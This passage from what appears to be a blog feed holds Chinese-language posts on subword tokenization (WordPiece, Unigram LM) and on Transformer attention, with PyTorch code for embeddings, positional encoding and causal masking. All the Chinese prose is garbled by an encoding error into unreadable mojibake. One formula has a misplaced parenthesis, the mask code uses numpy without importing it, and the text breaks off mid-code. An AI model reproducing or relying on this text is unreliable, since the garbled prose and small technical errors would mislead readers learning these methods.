ï¼š</p><ol><li>å°†è¯å…¸ä¸­çš„æ‰€æœ‰å­è¯æŒ‰ç…§é•¿åº¦ç”±å¤§åˆ°å°è¿›è¡Œæ’åºï¼›</li><li>å¯¹äºå•è¯wï¼Œä¾æ¬¡éå†æ’å¥½åºçš„è¯å…¸ã€‚æŸ¥çœ‹å½“å‰å­è¯æ˜¯å¦æ˜¯è¯¥å•è¯çš„å­å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¾“å‡ºå½“å‰å­è¯ï¼Œå¹¶å¯¹å‰©ä½™å•è¯å­—ç¬¦ä¸²ç»§ç»­åŒ¹é…ã€‚</li><li>å¦‚æœéå†å®Œå­—å…¸åï¼Œä»ç„¶æœ‰å­å­—ç¬¦ä¸²æ²¡æœ‰åŒ¹é…ï¼Œåˆ™å°†å‰©ä½™å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç‰¹æ®Šç¬¦å·è¾“å‡ºï¼Œå¦‚â€<unk>â€ã€‚</li><li>å•è¯çš„è¡¨ç¤ºå³ä¸ºä¸Šè¿°æ‰€æœ‰è¾“å‡ºå­è¯ã€‚</li></ol><p>è§£ç è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œå¦‚æœç›¸é‚»å­è¯é—´æ²¡æœ‰ä¸­æ­¢ç¬¦ï¼Œåˆ™å°†ä¸¤å­è¯ç›´æ¥æ‹¼æ¥ï¼Œå¦åˆ™ä¸¤å­è¯ä¹‹é—´æ·»åŠ åˆ†éš”ç¬¦ã€‚</p><h2 id="WordPiece"><a href="#WordPiece" class="headerlink" title="WordPiece"></a>WordPiece</h2><p>ä¸BPEç®—æ³•ç±»ä¼¼ï¼ŒWordPieceç®—æ³•ä¹Ÿæ˜¯æ¯æ¬¡ä»è¯è¡¨ä¸­é€‰å‡ºä¸¤ä¸ªå­è¯åˆå¹¶æˆæ–°çš„å­è¯ã€‚ä¸BPEçš„æœ€å¤§åŒºåˆ«åœ¨äºï¼Œå¦‚ä½•é€‰æ‹©ä¸¤ä¸ªå­è¯è¿›è¡Œåˆå¹¶ï¼šBPEé€‰æ‹©é¢‘æ•°æœ€é«˜çš„ç›¸é‚»å­è¯åˆå¹¶ï¼Œè€ŒWordPieceé€‰æ‹©èƒ½å¤Ÿæå‡è¯­è¨€æ¨¡å‹æ¦‚ç‡æœ€å¤§çš„ç›¸é‚»å­è¯åŠ å…¥è¯è¡¨ã€‚</p><p>æˆ‘ä»¬å‡è®¾å¥å­ $S&#x3D;(t_{1}, t_{2}, \ldots , t_{n})$ ç”± $n$ ä¸ªå­è¯ç»„æˆï¼Œå„å­è¯ç‹¬ç«‹å­˜åœ¨ï¼Œåˆ™å¥å­ $S$ çš„è¯­è¨€æ¨¡å‹ä¼¼ç„¶å€¼ç­‰ä»·äºæ‰€æœ‰å­è¯æ¦‚ç‡çš„ä¹˜ç§¯ï¼š<br>$$\log{}{P}(S)&#x3D;\sum_{i&#x3D;1}^{n}\log{}{P}(t_{i})$$</p><p>å‡è®¾æŠŠç›¸é‚»ä½ç½®çš„ $x$ å’Œ $y$ ä¸¤ä¸ªå­è¯è¿›è¡Œåˆå¹¶ï¼Œäº§ç”Ÿå­è¯ $z$ ï¼Œé‚£ä¹ˆæ­¤æ—¶å¥å­ $S$ çš„ä¼¼ç„¶å€¼å¯ä»¥è¡¨ç¤ºä¸ºï¼š<br>$$\log{}{P}(t_{z})-(\log{}{P}(t_{x})+\log{}{P}(t_{y}))&#x3D;\log{}{\frac{P(t_{z})}{P(t_{x}P(t_{y}))}}$$</p><p>ä¼¼ç„¶å€¼çš„å˜åŒ–å°±æ˜¯ä¸¤ä¸ªå­è¯ä¹‹é—´çš„äº’ä¿¡æ¯ã€‚WordPieceæ¯æ¬¡é€‰æ‹©åˆå¹¶çš„ä¸¤ä¸ªå­è¯ï¼Œä»–ä»¬å…·æœ‰æœ€å¤§çš„äº’ä¿¡æ¯å€¼ï¼Œä¹Ÿå°±æ˜¯ä¸¤å­è¯åœ¨è¯­è¨€æ¨¡å‹ä¸Šå…·æœ‰è¾ƒå¼ºçš„å…³è”æ€§ï¼Œå®ƒä»¬ç»å¸¸åœ¨è¯­æ–™ä¸­ä»¥ç›¸é‚»æ–¹å¼åŒæ—¶å‡ºç°ã€‚</p><div class="note note-info">            <p>äº’ä¿¡æ¯ï¼ˆMutual Informationï¼‰æ˜¯ä¸€ç§ç”¨äºè¡¡é‡ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´ç›¸å…³æ€§çš„ç»Ÿè®¡æŒ‡æ ‡ï¼Œå®ƒå¯ä»¥ç”¨æ¥è¡¡é‡ä¸¤ä¸ªéšæœºå˜é‡ä¹‹é—´çš„ä¿¡æ¯å…±äº«ç¨‹åº¦ã€‚åœ¨WordPieceç®—æ³•ä¸­ï¼Œå¯ä»¥ä½¿ç”¨äº’ä¿¡æ¯æ¥è¡¡é‡ä¸¤ä¸ªç›¸é‚»çš„å­è¯å•å…ƒä¹‹é—´çš„å…³è”ç¨‹åº¦ï¼Œä»¥å¸®åŠ©å†³å®šæ˜¯å¦å°†å®ƒä»¬åˆå¹¶ã€‚</p><p>äº’ä¿¡æ¯çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š<br>$$I(X;Y) &#x3D; \sum_{x \in X} \sum_{y \in Y} p(x,y) \log \left( \frac{p(x,y)}{p(x)p(y)} \right)$$</p>          </div><h2 id="Unigram-Language-Model-ULM"><a href="#Unigram-Language-Model-ULM" class="headerlink" title="Unigram Language Model (ULM)"></a>Unigram Language Model (ULM)</h2><p>Unigram Language Modelåˆ™æ˜¯å‡é‡æ³•,å³å…ˆåˆå§‹åŒ–ä¸€ä¸ªå¤§è¯è¡¨ï¼Œæ ¹æ®è¯„ä¼°å‡†åˆ™ä¸æ–­ä¸¢å¼ƒè¯è¡¨ï¼Œç›´åˆ°æ»¡è¶³é™å®šæ¡ä»¶ã€‚ULMç®—æ³•è€ƒè™‘äº†å¥å­çš„ä¸åŒåˆ†è¯å¯èƒ½ï¼Œå› è€Œèƒ½å¤Ÿè¾“å‡ºå¸¦æ¦‚ç‡çš„å¤šä¸ªå­è¯åˆ†æ®µã€‚</p><hr><p>å‚è€ƒï¼š</p><ol><li><a href="http://121.199.45.168:13008/06_mkdocs_pretrained_model/1%20BERT%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D.html">http://121.199.45.168:13008/06_mkdocs_pretrained_model/1%20BERT%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/98855346">https://zhuanlan.zhihu.com/p/98855346</a></li><li><a href="https://zhuanlan.zhihu.com/p/191648421">https://zhuanlan.zhihu.com/p/191648421</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Attention is all you need</title>
    <link href="/2024/03/06/Attention-is-all-you-need/"/>
    <url>/2024/03/06/Attention-is-all-you-need/</url>
    
    <content type="html"><![CDATA[<h1 id="æ³¨æ„åŠ›æœºåˆ¶"><a href="#æ³¨æ„åŠ›æœºåˆ¶" class="headerlink" title="æ³¨æ„åŠ›æœºåˆ¶"></a>æ³¨æ„åŠ›æœºåˆ¶</h1><p>æˆ‘ä»¬è§‚å¯Ÿäº‹ç‰©æ—¶ï¼Œä¹‹æ‰€ä»¥èƒ½å¤Ÿå¿«é€Ÿåˆ¤æ–­ä¸€ç§äº‹ç‰©(å½“ç„¶å…è®¸åˆ¤æ–­æ˜¯é”™è¯¯çš„), æ˜¯å› ä¸ºæˆ‘ä»¬å¤§è„‘èƒ½å¤Ÿå¾ˆå¿«æŠŠæ³¨æ„åŠ›æ”¾åœ¨äº‹ç‰©æœ€å…·æœ‰è¾¨è¯†åº¦çš„éƒ¨åˆ†ä»è€Œä½œå‡ºåˆ¤æ–­ï¼Œè€Œå¹¶éæ˜¯ä»å¤´åˆ°å°¾çš„è§‚å¯Ÿä¸€éäº‹ç‰©åï¼Œæ‰èƒ½æœ‰åˆ¤æ–­ç»“æœ. æ­£æ˜¯åŸºäºè¿™æ ·çš„ç†è®ºï¼Œå°±äº§ç”Ÿäº†æ³¨æ„åŠ›æœºåˆ¶.</p><blockquote><p>æ‘˜è‡ªè®ºæ–‡åŸæ–‡ï¼š<br>An attention function can be described as mapping a query and a set of key-value pairs to an output, where the query, keys, values, and output are all vectors. The output is computed as a weighted sum of the values, where the weight assigned to each value is computed by a compatibility function of the query with the corresponding key.</p></blockquote><p>æ³¨æ„åŠ›æœºåˆ¶çš„æ ¸å¿ƒå…¬å¼ä¸ºï¼š</p><p>$$ Attention(Q, K, V) &#x3D; softmax(\frac{QK^{T}}{\sqrt d_{k}})V $$</p><p>å¯¹äºæ³¨æ„åŠ›æœºåˆ¶æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦ä¸‰ä¸ªåŸºæœ¬çš„è¾“å…¥ï¼š $Q(query), K(key), V(value)$ ã€‚</p><p>åœ¨Transformerä¸­Encoderä½¿ç”¨çš„$ Q, K, V $ ï¼Œå…¶å®éƒ½æ˜¯ä»è¾“å…¥çŸ©é˜µ $X$ ç»è¿‡çº¿æ€§å˜åŒ–å¾—æ¥çš„ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼š</p><p>$$\begin{cases}<br>Q &#x3D; XW^{Q} \\<br>K &#x3D; XW^{K} \\<br>V &#x3D; XW^{V}<br>\end{cases}$$</p><p><img src="/Pictures/DL/Attention/f2.png" alt="img"></p><p>åœ¨è¿™å¼ å›¾ä¸­ï¼Œ$Q$ ä¸ $K^{T}$ ç»è¿‡MatMulï¼Œç”Ÿæˆäº†ç›¸ä¼¼åº¦çŸ©é˜µã€‚å¯¹ç›¸ä¼¼åº¦çŸ©é˜µæ¯ä¸ªå…ƒç´ é™¤ä»¥ $\sqrt d_{k}$ï¼Œå…¶ä¸º $K$ çš„ç»´åº¦å¤§å°ã€‚è¿™ä¸ªé™¤æ³•è¢«ç§°ä¸ºScaleã€‚</p><p>æ³¨æ„åŠ›çš„è®¡ç®—è¿‡ç¨‹ï¼š</p><p><img src="/Pictures/DL/Attention/f3.png" alt="img"></p><ol><li>query å’Œ key è¿›è¡Œç›¸ä¼¼åº¦è®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªquery å’Œ key ç›¸å…³æ€§çš„åˆ†å€¼</li><li>å°†è¿™ä¸ªåˆ†å€¼è¿›è¡Œå½’ä¸€åŒ–(softmax)ï¼Œå¾—åˆ°ä¸€ä¸ªæ³¨æ„åŠ›çš„åˆ†å¸ƒ</li><li>ä½¿ç”¨æ³¨æ„åŠ›åˆ†å¸ƒå’Œ value è¿›è¡Œè®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªèåˆæ³¨æ„åŠ›çš„æ›´å¥½çš„ value å€¼</li></ol><p>ä¸ºäº†å¢å¼ºæ‹Ÿåˆæ€§èƒ½ï¼ŒTransformerå¯¹Attentionç»§ç»­æ‰©å±•ï¼Œæå‡ºäº†å¤šå¤´æ³¨æ„åŠ›ï¼ˆMulti-Head Attentionï¼‰ã€‚</p><p><img src="/Pictures/DL/Attention/f4.png" alt="img"></p><p>å¯¹äºåŒæ ·çš„è¾“å…¥ $X$ ï¼Œæˆ‘ä»¬å®šä¹‰å¤šç»„ä¸åŒçš„ $W^{Q}, W^{K}, W^{V}$ ï¼Œè®¡ç®—å¾—åˆ°å¤šç»„ $Q,K,V$ ï¼Œç„¶åå­¦ä¹ åˆ°ä¸åŒçš„æ•°æ®ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬å®šä¹‰8ç»„å‚æ•°ï¼ŒåŒæ ·çš„è¾“å…¥ $X$ ï¼Œå°†å¾—åˆ°8ä¸ªä¸åŒçš„è¾“å‡º $Z_{0} ~ Z_{7}$ ï¼Œåœ¨è¾“å‡ºåˆ°ä¸‹ä¸€å±‚å‰ï¼Œæˆ‘ä»¬éœ€è¦å°†8ä¸ªè¾“å‡ºæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œè¿›è¡Œä¸€æ¬¡çº¿æ€§å˜æ¢ï¼Œå°†ç»´åº¦é™ä½åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»´åº¦ã€‚</p><h1 id="Self-Attention"><a href="#Self-Attention" class="headerlink" title="Self-Attention"></a>Self-Attention</h1><p>Self-attentionå°±æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„attentionã€‚</p><p>attentionå’Œself attention å…¶å…·ä½“è®¡ç®—è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è®¡ç®—å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–è€Œå·²ã€‚</p><p>attentionæ˜¯sourceå¯¹targetçš„attentionï¼Œ</p><p>è€Œself attention æ˜¯source å¯¹sourceçš„attentionã€‚</p><p>å³è¾“å…¥çš„Q&#x3D;K&#x3D;Vã€‚</p><p>åœ¨ç¿»è¯‘ä»»åŠ¡ä¸­ï¼Œå¦‚æœæºå¥å­â‰ ç›®æ ‡å¥å­ï¼Œé‚£ä¹ˆä½ ç”¨ç›®æ ‡å¥å­ä¸­çš„è¯å»queryæºå¥å­ä¸­çš„æ‰€æœ‰è¯çš„keyï¼Œå†åšç›¸åº”è¿ç®—ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯Attentionï¼›å¦‚æœä½ çš„éœ€æ±‚ä¸æ˜¯ç¿»è¯‘ï¼Œè€Œæ˜¯å¯¹å½“å‰è¿™å¥è¯ä¸­æŸå‡ ä¸ªè¯ä¹‹é—´çš„å…³ç³»æ›´æ„Ÿå…´è¶£ï¼ŒæœŸæœ›å¯¹ä»–ä»¬è¿›è¡Œè®¡ç®—ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯Self-Attentionã€‚</p><p>ä»èŒƒå›´ä¸Šæ¥è®²ï¼Œæ³¨æ„åŠ›æœºåˆ¶æ˜¯åŒ…å«è‡ªæ³¨æ„åŠ›æœºåˆ¶çš„ã€‚æ³¨æ„åŠ›æœºåˆ¶ç»™å®šKã€Qã€Vï¼Œå…¶ä¸­Qå’ŒVå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œè€ŒKå¾€å¾€ç­‰äºVï¼ˆä¸ç›¸ç­‰ä¹Ÿå¯ä»¥ï¼‰ï¼›è€Œè‡ªæ³¨æ„åŠ›æœºåˆ¶è¦æ±‚K&#x3D;Q&#x3D;Vã€‚</p><h1 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h1><p>Transformeræ¨¡å‹åŸºäºEncoder-Decoderæ¶æ„ã€‚ä¸€èˆ¬åœ°ï¼Œåœ¨Encoder-Decoderä¸­ï¼ŒEncoderéƒ¨åˆ†å°†ä¸€éƒ¨åˆ†ä¿¡æ¯æŠ½å–å‡ºæ¥ï¼Œç”Ÿæˆä¸­é—´ç¼–ç ä¿¡æ¯ï¼Œå‘é€åˆ°Decoderä¸­ã€‚</p><p><img src="/Pictures/DL/Attention/f1.png" alt="img"></p><p>æˆ‘ä»¬å¯ä»¥å°†æ•´ä¸ªæ¶æ„æŠ½è±¡ä¸ºå››ä¸ªç»„æˆéƒ¨åˆ†ï¼š</p><ol><li>è¾“å…¥éƒ¨åˆ†</li><li>è¾“å‡ºéƒ¨åˆ†</li><li>ç¼–ç å™¨éƒ¨åˆ†</li><li>è§£ç å™¨éƒ¨åˆ†</li></ol><h2 id="è¾“å…¥éƒ¨åˆ†"><a href="#è¾“å…¥éƒ¨åˆ†" class="headerlink" title="è¾“å…¥éƒ¨åˆ†"></a>è¾“å…¥éƒ¨åˆ†</h2><p><img src="/Pictures/DL/Attention/f5.png" alt="img"></p><ul><li>æºæ–‡æœ¬åµŒå…¥å±‚åŠå…¶ä½ç½®ç¼–ç å™¨</li><li>ç›®æ ‡æ–‡æœ¬åµŒå…¥å±‚åŠå…¶ä½ç½®ç¼–ç å™¨</li></ul><p>å…³äºä½ç½®ç¼–ç å™¨ Positional Encodingï¼š</p><p>Transformeræ¨¡å‹çš„è¾“å…¥ä¸ºä¸€ç³»åˆ—è¯ï¼Œè¯éœ€è¦è½¬åŒ–ä¸ºè¯å‘é‡ã€‚ä¸€èˆ¬çš„è¯­è¨€æ¨¡å‹éƒ½éœ€è¦ä½¿ç”¨Embeddingå±‚ï¼Œç”¨ä»¥å°†è¯è½¬åŒ–ä¸ºè¯å‘é‡ã€‚Transformeræ²¡æœ‰é‡‡ç”¨RNNçš„ç»“æ„ï¼Œä¸èƒ½åˆ©ç”¨å•è¯çš„é¡ºåºä¿¡æ¯ï¼Œä½†é¡ºåºä¿¡æ¯å¯¹äºNLPä»»åŠ¡æ¥è¯´éå¸¸é‡è¦ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼ŒTransformerå¢åŠ äº†ä½ç½®ç¼–ç ï¼ˆPositional Encodingï¼‰ã€‚</p><p>$$ PE_{(pos,2i)} &#x3D; sin(pos &#x2F; 10000^{2i &#x2F; d})$$<br>$$ PE_{(pos,2i+1)} &#x3D; cos(pos &#x2F; 10000^{2i &#x2F; d})$$</p><p>$pos$ ä»£è¡¨å•è¯åœ¨å¥å­ä¸­çš„ä½ç½®ï¼Œ $d$ è¡¨ç¤ºè¯å‘é‡çš„ç»´åº¦ï¼Œ $2i$ è¡¨ç¤ºå¶æ•°ç»´åº¦ï¼Œ $2i+1$ è¡¨ç¤ºå¥‡æ•°ç»´åº¦ã€‚ç”Ÿæˆçš„æ˜¯[âˆ’1,1]åŒºé—´å†…çš„å®æ•°ã€‚</p><h3 id="Embeddingå±‚å’ŒPositional-Encodingå±‚çš„ä»£ç å®ç°ï¼š"><a href="#Embeddingå±‚å’ŒPositional-Encodingå±‚çš„ä»£ç å®ç°ï¼š" class="headerlink" title="Embeddingå±‚å’ŒPositional Encodingå±‚çš„ä»£ç å®ç°ï¼š"></a>Embeddingå±‚å’ŒPositional Encodingå±‚çš„ä»£ç å®ç°ï¼š</h3><p>xçš„å¤§å°ä¸º (batch_size, sequence_length, embedding_dim)<br>peçš„å¤§å°ä¸º (max_len, embedding_dim)<br>è¿™é‡Œçš„ sequence_length $\ne$ max_lenï¼Œéœ€è¦åŒ¹é…å½¢çŠ¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> torch.autograd <span class="hljs-keyword">import</span> Variable<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Embeddings</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, d_model, vocab</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        d_model: æŒ‡è¯åµŒå…¥çš„ç»´åº¦ </span><br><span class="hljs-string">        vocab: æŒ‡è¯è¡¨çš„å¤§å°</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">super</span>(Embeddings, self).__init__()<br>        <span class="hljs-comment"># è°ƒç”¨nnä¸­çš„é¢„å®šä¹‰å±‚Embedding, è·å¾—ä¸€ä¸ªè¯åµŒå…¥å¯¹è±¡self.lut</span><br>        self.lut = nn.Embedding(vocab, d_model)<br>        self.d_model = d_model<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-comment"># ä¹˜ä»¥ç¼©æ”¾å› å­ï¼Œé€šå¸¸ä¸ºè¯åµŒå…¥çš„ç»´åº¦å¼€æ ¹å·</span><br>        <span class="hljs-keyword">return</span> self.lut(x) * math.sqrt(self.d_model)<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PositionalEncoding</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, d_model, dropout, max_len=<span class="hljs-number">5000</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        d_model: è¯åµŒå…¥ç»´åº¦, </span><br><span class="hljs-string">        dropout: ç½®0æ¯”ç‡, max_len: æ¯ä¸ªå¥å­çš„æœ€å¤§é•¿åº¦</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">super</span>(PositionalEncoding, self).__init__()<br>        <span class="hljs-comment"># å®ä¾‹åŒ–nnä¸­é¢„å®šä¹‰çš„Dropoutå±‚, å¹¶å°†dropoutä¼ å…¥å…¶ä¸­, è·å¾—å¯¹è±¡self.dropout</span><br>        self.dropout = nn.Dropout(p=dropout)<br>        <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªä½ç½®ç¼–ç çŸ©é˜µ, å®ƒæ˜¯ä¸€ä¸ª0é˜µï¼ŒçŸ©é˜µçš„å¤§å°æ˜¯max_len x d_model.</span><br>        pe = torch.zeros(max_len, d_model)<br><br>        <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªç»å¯¹ä½ç½®çŸ©é˜µï¼Œç”¨å®ƒçš„ç´¢å¼•å»è¡¨ç¤ºè¯æ±‡çš„ç»å¯¹ä½ç½®ã€‚</span><br>        <span class="hljs-comment"># é¦–å…ˆä½¿ç”¨arangeæ–¹æ³•è·å¾—ä¸€ä¸ªè¿ç»­è‡ªç„¶æ•°å‘é‡ï¼Œç„¶åä½¿ç”¨unsqueezeæ–¹æ³•æ‹“å±•å‘é‡ç»´åº¦ä½¿å…¶æˆä¸ºçŸ©é˜µ </span><br>        position = torch.arange(<span class="hljs-number">0</span>, max_len).unsqueeze(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-comment"># å¯¹åº”å…¬å¼ï¼Œå°†å¥‡æ•°ç»´åº¦å’Œå¶æ•°ç»´åº¦åˆ†åˆ«å¯¹åº”åˆå§‹åŒ–ã€‚</span><br>        div_term = torch.exp(torch.arange(<span class="hljs-number">0</span>, d_model, <span class="hljs-number">2</span>) *<br>                             -(math.log(<span class="hljs-number">10000.0</span>) / d_model))<br>        pe[:, <span class="hljs-number">0</span>::<span class="hljs-number">2</span>] = torch.sin(position * div_term)<br>        pe[:, <span class="hljs-number">1</span>::<span class="hljs-number">2</span>] = torch.cos(position * div_term)<br><br>        <span class="hljs-comment"># ä½¿ç”¨unsqueezeæ‹“å±•ç»´åº¦ã€‚</span><br>        pe = pe.unsqueeze(<span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment"># æœ€åæŠŠpeä½ç½®ç¼–ç çŸ©é˜µæ³¨å†Œæˆæ¨¡å‹çš„buffer</span><br>        self.register_buffer(<span class="hljs-string">&#x27;pe&#x27;</span>, pe)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-comment"># é€‚é…å¼ é‡å¤§å°</span><br>        x = x + self.pe[:, :x.size(<span class="hljs-number">1</span>)].detach()<br>        <span class="hljs-keyword">return</span> self.dropout(x)<br></code></pre></td></tr></table></figure><h2 id="ç¼–ç å™¨éƒ¨åˆ†"><a href="#ç¼–ç å™¨éƒ¨åˆ†" class="headerlink" title="ç¼–ç å™¨éƒ¨åˆ†"></a>ç¼–ç å™¨éƒ¨åˆ†</h2><ul><li>ç”±Nä¸ªç¼–ç å™¨å±‚å †å è€Œæˆ</li><li>æ¯ä¸ªç¼–ç å™¨å±‚ç”±ä¸¤ä¸ªå­å±‚è¿æ¥ç»“æ„ç»„æˆ</li><li>ç¬¬ä¸€ä¸ªå­å±‚è¿æ¥ç»“æ„åŒ…æ‹¬ä¸€ä¸ªå¤šå¤´è‡ªæ³¨æ„åŠ›å­å±‚å’Œè§„èŒƒåŒ–å±‚ä»¥åŠä¸€ä¸ªæ®‹å·®è¿æ¥</li><li>ç¬¬äºŒä¸ªå­å±‚è¿æ¥ç»“æ„åŒ…æ‹¬ä¸€ä¸ªå‰é¦ˆå…¨è¿æ¥å­å±‚å’Œè§„èŒƒåŒ–å±‚ä»¥åŠä¸€ä¸ªæ®‹å·®è¿æ¥</li></ul><p>Add &amp; Normå±‚ç”± Add å’Œ Norm ä¸¤éƒ¨åˆ†ç»„æˆã€‚Add ç±»ä¼¼ ResNet æå‡ºçš„æ®‹å·®è¿æ¥ï¼Œä»¥è§£å†³æ·±å±‚ç½‘ç»œè®­ç»ƒä¸ç¨³å®šçš„é—®é¢˜ã€‚Norm ä¸ºå½’ä¸€åŒ–å±‚ï¼Œå³ <em>Layer Normalization</em> ï¼Œé€šå¸¸ç”¨äº RNN ç»“æ„ã€‚</p><p>Feed Forwardå±‚ç”±ä¸¤ä¸ªå…¨è¿æ¥å±‚æ„æˆï¼Œç¬¬ä¸€å±‚çš„æ¿€æ´»å‡½æ•°ä¸º ReLuï¼Œç¬¬äºŒå±‚ä¸ä½¿ç”¨æ¿€æ´»å‡½æ•°ã€‚</p><p>Multi-Head Attention é‡‡ç”¨äº† Mask æ“ä½œï¼Œå³æ©ç å¼ é‡,å› ä¸ºåœ¨ç¿»è¯‘çš„è¿‡ç¨‹ä¸­æ˜¯é¡ºåºç¿»è¯‘çš„ï¼Œå³ç¿»è¯‘å®Œç¬¬ i ä¸ªå•è¯ï¼Œæ‰å¯ä»¥ç¿»è¯‘ç¬¬i+1 ä¸ªå•è¯ã€‚</p><p><img src="/Pictures/DL/Attention/f7.png" alt="Mask"></p><p>0åˆ°4å³ä»£è¡¨æŒ‰é¡ºåºçš„å‰5ä¸ªå•è¯ã€‚</p><h3 id="Mask"><a href="#Mask" class="headerlink" title="Mask"></a>Mask</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">subsequent_mask</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    sizeæ˜¯æ©ç å¼ é‡æœ€åä¸¤ä¸ªç»´åº¦çš„å¤§å°,å½¢æˆä¸€ä¸ªæ–¹é˜µ</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    attn_shape = (<span class="hljs-number">1</span>, size, size)<br><br>    <span class="hljs-comment"># ç„¶åä½¿ç”¨np.onesæ–¹æ³•å‘è¿™ä¸ªå½¢çŠ¶ä¸­æ·»åŠ 1å…ƒç´ ,å½¢æˆä¸Šä¸‰è§’é˜µ </span><br>    <span class="hljs-comment"># å†ä½¿å…¶ä¸­çš„æ•°æ®ç±»å‹å˜ä¸ºæ— ç¬¦å·8ä½æ•´å½¢unit8 </span><br>    subsequent_mask = np.triu(np.ones(attn_shape), k=<span class="hljs-number">1</span>).astype(<span class="hljs-string">&#x27;uint8&#x27;</span>)<br><br>    <span class="hljs-comment"># æœ€åå°†numpyç±»å‹è½¬åŒ–ä¸ºtorchä¸­çš„tensor, å†…éƒ¨åšä¸€ä¸ª1 - çš„æ“ä½œ, å³å°†ä¸Šä¸‰è§’è½¬ä¸ºä¸‹ä¸‰è§’ã€‚</span><br>    <span class="hljs-keyword">return</span> torch.from_numpy(<span class="hljs-number">1</span> - subsequent_mask)<br></code></pre></td></tr></table></figure><h3 id="æ³¨æ„åŠ›çš„è®¡ç®—å®ç°"><a href="#æ³¨æ„åŠ›çš„è®¡ç®—å®ç°" class="headerlink" title="æ³¨æ„åŠ›çš„è®¡ç®—å®ç°"></a>æ³¨æ„åŠ›çš„è®¡ç®—å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 